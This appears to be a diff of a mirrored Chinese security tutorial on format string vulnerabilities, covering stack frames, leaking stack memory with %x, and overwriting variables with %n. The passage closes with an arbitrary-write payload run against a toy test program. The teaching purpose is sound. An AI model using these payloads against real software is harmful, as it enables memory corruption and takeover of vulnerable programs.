@@ -3,20 +3,20 @@
 			<head>
 			     <title>漏洞挖掘基础之格式化字符串 - 珈蓝夜宇</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			</head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/papers/9426">http://drops.wooyun.org/papers/9426</a></h1>
 				
       <p>
-        <h1>0x00 序</h1>
+        </p><h1>0x00 序</h1>
 
-<hr />
+<hr>
 
 <p>格式化字符串漏洞是一个很古老的漏洞了，现在几乎已经见不到这类漏洞的身影，但是作为漏洞分析的初学者来说，还是很有必要研究一下的，因为这是基础啊!!!所以就有了今天这篇文章。我文章都写好了,就差你来跟我搞二进制了!%>.&lt;%</p>
 
 <h1>0x01 基础知识&#45;--栈</h1>
 
-<hr />
+<hr>
 
 <p>在进行真正的格式化字符串攻击之前，我们需要了解一些基础知识，方便更好的理解该类漏洞。 个人感觉我们还需要一些堆栈相关的基础知识才能更好的理解并运用格式化字符串漏洞。接下来我们就一起看一下栈相关的知识： 说到栈我们不得不提的就是函数调用与参数传递，因为栈的作用就是动态的存储函数之间的调用关系，从而保证在被调用函数返回时能够回到母函数中继续执行。栈其实是一种数据结构，栈中的数据是先进后出（First In Last Out），常见的操作有两种：</p>
 
@@ -60,7 +60,7 @@ int main (int argc, char **argv, char **envp)
 
 <p>程序的执行过程如下图所示：</p>
 
-<p><img src="http://static.wooyun.org//drops/20151014/20151014060828105082015-10-03_171444.jpg" alt="Alt text" /></p>
+<p><img src="../images_result/images/20151014060828105082015-10-03_171444.jpg" alt="Alt text"></p>
 
 <p>通过上图我们可以看到程序执行的流程：<code>main--func_A--func_B--func_A--main</code>，CPU在执行程序时是如何知道各个函数之间的调用关系呢，接下来我们将介绍一个新的名词：栈帧。当函数被调用时，系统栈会为这个函数开辟一个新的栈帧，这个栈帧中的内存空间被它所属的函数独占，当函数返回时，系统栈会弹出该函数所对应的栈帧。32位系统下提供了两个特殊的寄存器（ESP和EBP）识栈帧。</p>
 
@@ -107,11 +107,11 @@ int main (int argc, char **argv, char **envp)
 
 <p>func_A栈帧如下图所示：</p>
 
-<p><img src="http://static.wooyun.org//drops/20151014/20151014060825922302015-10-03_171313.jpg" alt="Alt text" /></p>
+<p><img src="../images_result/images/20151014060825922302015-10-03_171313.jpg" alt="Alt text"></p>
 
 <p>我们将通过以下图例对本次函数调用做一个总结：</p>
 
-<p><img src="http://static.wooyun.org//drops/20151014/20151014060830928522015-10-03_183702.jpg" alt="Alt text" /></p>
+<p><img src="../images_result/images/20151014060830928522015-10-03_183702.jpg" alt="Alt text"></p>
 
 <p>通过前面的函数调用细节以及栈中数据的分布情况，我们可以发现局部变量是在栈中挨个排放的，如果这些局部变量中有数组之类的缓冲区，并且程序存在数组越界的问题，那么越界的数组元素就有可能破坏栈中相邻变量的值，进而破坏EBP的值、返回地址等重要数据。</p>
 
@@ -121,7 +121,7 @@ int main (int argc, char **argv, char **envp)
 
 <h1>0x02 格式化字符串漏洞原理</h1>
 
-<hr />
+<hr>
 
 <p>格式化串漏洞和普通的栈溢出有相似之处，但又有所不同，它们都是利用了程序员的疏忽大意来改变程序运行的正常流程。</p>
 
@@ -183,8 +183,8 @@ return 0;
 
 <p>我们编译之后运行：</p>
 
-<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="27454e4940534649404052464967524552495352">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ gcc -fno-stack-protector -o format format.c
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ef8d8681889b8e8188889a8e81af9a8d9a819b9a">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ ./format 
+<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="27454e4940534649404052464967524552495352">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ gcc -fno-stack-protector -o format format.c
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ef8d8681889b8e8188889a8e81af9a8d9a819b9a">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ ./format 
 test 1 2 3
 </code></pre>
 
@@ -192,18 +192,18 @@ test 1 2 3
 
 <p><code>printf("%s %d %d %d %x\n",buf,a,b，c)</code>，编译后运行：</p>
 
-<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="fd9f94939a899c939a9a889c93bd889f88938988">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ gcc -z execstack -fno-stack-protector -o format1 format.c
+<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="fd9f94939a899c939a9a889c93bd889f88938988">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ gcc -z execstack -fno-stack-protector -o format1 format.c
 format.c: In function ‘main’:
 format.c:6:1: warning: format ‘%x’ expects a matching ‘unsigned int’ argument [-Wformat=]
  printf("%s %d %d %d %x\n",buf,a,b,c);
  ^
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="25474c4b4251444b424250444b655047504b5150">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ ./format1
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="25474c4b4251444b424250444b655047504b5150">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ ./format1
 test 1 2 3 c30000
 </code></pre>
 
 <p>虽然gcc在编译的时候提示了一个warning，但还是编译通过了，我们运行后发现多输出了一个C30000，这是个什么数据呢，我们用gdb调试一下看看吧，我们在printf()函数处下个断点，然后运行程序，程序停在了<code>printf()</code>函数入口处<code>0xb7e652f0 __printf+0 push   %ebx</code>。大家可能发现了我的gdb 有点不大一样，是因为我用了一个叫做gdb-dashboard的可视化工具，个人感觉还是比较方便的，可以实时的查看寄存器、内存、反汇编等，感兴趣的同学可以去github下载安装一下试试：<code>https://github.com/cyrus-and/gdb-dashboard</code></p>
 
-<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8be9e2e5ecffeae5ececfeeae5cbfee9fee5fffe">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ gdb ./format1
+<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8be9e2e5ecffeae5ececfeeae5cbfee9fee5fffe">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ gdb ./format1
 GNU gdb (Ubuntu 7.8-1ubuntu4) 7.8.0.20141001-cvs
 Copyright (C) 2014 Free Software Foundation, Inc.
 License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
@@ -300,13 +300,13 @@ arg format = 0x8048510 "%s %d %d %d %x\n"
 0xbffff04c: 0x00000001  0xb7fc13c4  0xbffff070  0x00000000
 </code></pre>
 
-<p><img src="http://static.wooyun.org//drops/20151014/20151014060831430571444187955740.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/20151014060831430571444187955740.png" alt="Alt text"></p>
 
 <p>看了上面的图，相信大家已经很明白了吧，只要我们能够控制format的，我们就可以一直读取内存数据。</p>
 
 <pre><code>printf("%s %d %d %d %x %x %x %x %x %x %x %x\n",buf,a,b,c)
 
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="03616a6d6477626d646476626d437661766d7776">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ ./format2
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="03616a6d6477626d646476626d437661766d7776">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ ./format2
 test 1 2 3 c30000 1 80482bd bf8bf301 2f 804a000 740484d2 747365
 </code></pre>
 
@@ -324,7 +324,7 @@ int main(int argc, char *argv[])
 
 <p>有了上一个小例子的经验，我们可以直接尝试去读取str[]的内容呢</p>
 
-<p>gdb调试，单步运行完<code>call   0x8048340 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="dbbdbcbeafa89babb7af">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;</code>后输入：</p>
+<p>gdb调试，单步运行完<code>call   0x8048340 &lt;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="dbbdbcbeafa89babb7af">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>&gt;</code>后输入：</p>
 
 <p><code>AAAA%08x%08x%08x%08x%08x%08x</code>（学过C语言的肯定知道%08x的意义，不明白的也不要紧，可以先看一下后面的特性三，我这里就不再多说了）</p>
 
@@ -367,7 +367,7 @@ main()
 
 <p>可以发现我们用%n成功修改了num的值：</p>
 
-<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="bcded5d2dbc8ddd2dbdbc9ddd2fcc9dec9d2c8c9">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ ./format2
+<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="bcded5d2dbc8ddd2dbdbc9ddd2fcc9dec9d2c8c9">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ ./format2
 Before: num = 66666666
 66666666
 After: num = 8
@@ -392,7 +392,7 @@ main()
 
 <p>可以看到我们的num值被改为了100</p>
 
-<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="43212a2d2437222d242436222d033621362d3736">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ ./format2
+<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="43212a2d2437222d242436222d033621362d3736">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ ./format2
 Before: num = 66666666
 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
 66666666
@@ -407,12 +407,12 @@ printf("After: num = %x\n", num);
 
 <p>可以看到，我们的num被成功修改为8048000</p>
 
-<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="c5a7acaba2b1a4aba2a2b0a4ab85b0a7b0abb1b0">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ ./format2
+<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="c5a7acaba2b1a4aba2a2b0a4ab85b0a7b0abb1b0">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ ./format2
 Before: num = 66666666
 中间的0省略...........
 00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000066666666
 After: num = 8048000
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="80e2e9eee7f4e1eee7e7f5e1eec0f5e2f5eef4f5">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ 
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="80e2e9eee7f4e1eee7e7f5e1eec0f5e2f5eef4f5">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ 
 </code></pre>
 
 <p>明白了这个原理之后，我们接下来尝试<code>任意地址写</code>作为本章的结束。知识库之前有一篇格式化字符串漏洞文章，在文章最后有一个实例，但是在我按照作者的方法进行测试的时候，发现并不能成功利用，于是我利用任意地址写的方法完成该实验。</p>
@@ -455,13 +455,13 @@ if(flag == 2000)
 
 <p>我们继续在gdb调试，执行get()函数后随便输入AAAAAAA，执行到printf()的时候观察栈区：</p>
 
-<p><img src="http://static.wooyun.org//drops/20151014/20151014060833120791444223826739.png" alt="Alt text" /></p>
+<p><img src="../images_result/images/20151014060833120791444223826739.png" alt="Alt text"></p>
 
 <p>我们如果只输入%x的话就可以读出esp+4地址上的数据，也就是0xbfffefe4，而我们需要修改的地址为0xbffff048，这两个地址的偏移为0x64。</p>
 
 <p>下面我们就可以直接运行程序，并输入%x，然后获取ESP+4地址内的值：</p>
 
-<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="caa8a3a4adbeaba4adadbfaba48abfa8bfa4bebf">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ ./test
+<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="caa8a3a4adbeaba4adadbfaba48abfa8bfa4bebf">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ ./test
 %x
 bffff024
 </code></pre>
@@ -470,10 +470,10 @@ bffff024
 
 <p>最后就是要在地址0xbffff088处写入2000： \x88\xf0\xff\xbf%10x%10x%10x%1966x%n</p>
 
-<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="92f0fbfcf5e6f3fcf5f5e7f3fcd2e7f0e7fce6e7">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ python -c "print '\x88\xf0\xff\xbf%10x%10x%10x%.1966x%n'" &gt; 11
-<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="07656e6960736669606072666947726572697372">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ cat 11 | ./test 
+<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="92f0fbfcf5e6f3fcf5f5e7f3fcd2e7f0e7fce6e7">[email&#160;protected]</a><script data-cfhash="f9e31" type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~/Desktop/format$ python -c "print '\x88\xf0\xff\xbf%10x%10x%10x%.1966x%n'" &gt; 11
